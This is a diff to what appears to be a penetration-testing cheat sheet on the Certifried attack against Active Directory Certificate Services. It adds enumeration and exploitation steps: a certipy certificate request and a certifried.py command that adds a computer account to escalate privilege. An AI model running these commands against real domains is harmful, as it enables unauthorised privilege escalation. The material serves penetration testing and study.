@@ -2,6 +2,14 @@
 
 ### An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.
 
+## Enumeration
+
+ - certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User'
+
+### If Certipy doesn't print Certificate object SID is [...] after obtaining the certificate, then the attack can be conducted.
+
+## Exploitation
+
 #### 1) Request certificate manually
 
  - python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 (Add the computer and update necessary attributes)
